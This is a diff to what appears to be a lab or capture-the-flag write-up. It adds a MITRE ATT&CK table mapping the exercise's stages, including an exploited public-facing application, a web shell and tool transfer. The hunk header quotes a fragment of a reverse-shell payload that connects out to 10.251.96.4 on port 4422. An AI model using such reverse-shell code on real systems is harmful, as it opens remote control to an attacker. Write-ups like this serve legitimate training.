@@ -252,4 +252,25 @@ s.connect((%2210.251.96.4%22,4422))
 
 Answer:4422
 
-### Done By Ruthran-sec
+# MITRE ATT&CK Mapping
+
+| ATT&CK Stage | Technique ID | Technique |
+| --- | --- | --- |
+| Reconnaissance | T1595.001 | **Active Scanning: Scanning IP Blocks** |
+| Resource Development | - | - |
+| Initial Access | T1190 | **Exploit Public-Facing Application** |
+| Execution | T1059 | **Command and Scripting Interpreter** |
+| Persistence | T1505.003 | **Server Software Component: Web Shell** |
+| Privilege Escalation | - | - |
+| Stealth | T1078 | **Valid Accounts** |
+| Defense Impairment | - | - |
+| Credential Access | T1078 | **Valid Accounts** |
+| Discovery | T1033 | **System Owner/User Discovery** |
+| Lateral Movement | - | - |
+| Collection | - | - |
+| Command and Control | T1105 | **Ingress Tool Transfer** |
+| Exfiltration | - | - |
+| Impact | - | - |
+
+### Done By 
+#### Ruthran-sec
